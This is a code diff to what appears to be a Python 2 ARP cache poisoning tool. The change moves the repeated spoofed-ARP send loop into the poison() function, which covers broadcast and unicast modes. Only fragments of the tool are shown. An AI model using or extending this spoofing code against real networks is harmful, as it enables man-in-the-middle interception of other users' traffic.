@@ -37,7 +37,11 @@ def poison(interface, src_mac, src_ip, dst_mac, dst_ip):
 
 	#packet must be 60 bytes
 	tail = (60 - len(ethernet + arp_payload)) * "\x00"
-	s.send(ethernet + arp_payload + tail)
+
+	#send the packet every SLEEP_TIME seconds
+	while True:
+		s.send(ethernet + arp_payload + tail)
+		time.sleep(SLEEP_TIME)
 
 def main():
 	usage = "usage: %prog [options]"
@@ -61,9 +65,7 @@ def main():
 		src_ip = ''.join("%0.2X" % int(i) for i in ip).decode('hex')
 		src_mac = options.source_mac.replace(":", "").decode('hex')
 		
-		while True:
-			poison(options.interface, src_mac, src_ip, "\xff\xff\xff\xff\xff\xff", "\xff\xff\xff\xff")
-			time.sleep(SLEEP_TIME)
+		poison(options.interface, src_mac, src_ip, "\xff\xff\xff\xff\xff\xff", "\xff\xff\xff\xff")
 	
 	#sending a unicast arp poison
 	elif(not options.broadcast and options.spoofed_ip and options.source_mac and options.target_mac and options.target_ip):
@@ -78,9 +80,7 @@ def main():
 
 		src_mac = options.target_mac.replace(":", "").decode('hex')		
 
-		while True:
-			poison(options.interface, src_mac, src_ip, dst_mac, dst_ip)
-			time.sleep(SLEEP_TIME)
+		poison(options.interface, src_mac, src_ip, dst_mac, dst_ip)
 
 	#print menue
 	else:
